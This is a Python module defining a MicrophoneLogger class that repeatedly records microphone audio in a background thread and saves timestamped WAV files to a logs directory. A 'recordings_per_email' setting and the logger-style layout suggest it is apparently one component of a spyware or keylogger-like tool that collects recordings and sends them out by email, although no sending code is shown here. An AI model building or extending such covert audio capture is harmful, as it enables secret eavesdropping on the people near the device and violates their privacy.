from sounddevice import rec, wait
from scipy.io.wavfile import write
from os.path import join
from time import sleep
import threading

from config.config_loader import get_section_config
from core.utils.logging_utils import timestamp


class MicrophoneLogger:
    def __init__(self) -> None:
        self.config = get_section_config("MICROPHONE")
        self.logs_directory_path = self.config["logs_directory_path"]
        self.error_file_path = join(self.config["logs_directory_path"], "errors.txt")
        self.counter = 0
        self.counter_max = int(self.config["recordings_per_email"])  # Convert to int
        self.interval = int(self.config["interval"])  # Convert to int
        self.stop_event = threading.Event()
        self.thread = None

    def log_microphone(self) -> None:
        recording = rec(
            int(self.interval * 44100), samplerate=44100, channels=1, dtype="int16"
        )
        wait()
        write(
            join(self.logs_directory_path, f"{timestamp()}.wav"),
            44100,
            recording,
        )

    def run(self):
        while not self.stop_event.is_set():
            self.log_microphone()
            self.stop_event.wait(self.interval)

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self.stop_event.clear()
            self.thread = threading.Thread(target=self.run, name="MicrophoneLogger")
            self.thread.start()
        else:
            print("Attempted to start microphone logger while it has already started!")

    def stop(self):
        self.stop_event.set()
        if self.thread and self.thread.is_alive():
            self.thread.join()
            print("Microphone logger stopped.")
        else:
            print("Attempted to stop microphone logger while it has not started!")
